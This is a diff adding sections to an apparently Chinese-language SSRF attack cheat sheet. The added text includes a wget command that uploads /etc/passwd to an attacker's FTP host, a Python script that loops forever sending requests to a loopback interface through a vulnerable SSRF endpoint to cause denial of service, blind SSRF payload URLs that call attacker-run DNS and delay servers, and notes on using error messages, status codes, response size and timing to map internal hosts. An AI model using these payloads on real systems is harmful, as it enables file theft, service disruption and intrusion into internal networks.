@@ -276,3 +276,63 @@ ssl_sock.close()
 ```bash
 openssl s_client -connect 目标地址:443 -servername "内部目标地址" -crlf
 ```
+
+(5)wget
+
+```bash
+wget --method=PUT --body-file=/etc/passwd ftp://攻击者主机/
+```
+
+(6)DoS
+
+环回接口DoS攻击
+```python
+import requests
+from urllib.parse import urlencode
+
+base_url = "http://目标WEB应用程序地址/ssrf/ssrf.php?"
+params = {
+    "target": "http://localhost:8080/接口"
+}
+while True:
+    full_url = base_url + urlencode(params)
+    requests.get(full_url)
+```
+
+## 盲注
+
+DNS
+```html
+http://受害者网站/ssrf?payload=http://攻击者的DNS服务器
+```
+
+时间延迟
+```html
+http://受害者网站/ssrf?payload=http://攻击者服务器/delay
+```
+
+侧通道泄露
+
+当利用SSRF漏洞盲注时，服务可能会泄露有关返回响应的一些信息。 例如，假设通过 XXE 进行了SSRF盲注，错误消息可能会指示是否含有漏洞：
+
++ 已返回回复
+
+Error parsing request: System.Xml.XmlException: Expected DTD markup was not found. Line 1, position 1.
+
++ 主机和端口不可达
+
+Error parsing request: System.Net.WebException: Unable to connect to the remote server
+
+同样，在 XXE 之外，Web 应用程序也可能存在侧通道泄漏，可以通过检查以下方面的差异来确定：
+
++ 响应状态码
+
+在线内部资产，端口响应为 200 OK;离线内部资产，端口相应为 500 Internal Server Error
+
++ 回复内容
+
+响应大小（以字节为单位）的大小取决于尝试请求的 URL 是否可访问
+
++ 响应时间
+
+响应时间或慢或快取决于尝试请求的 URL 是否可访问
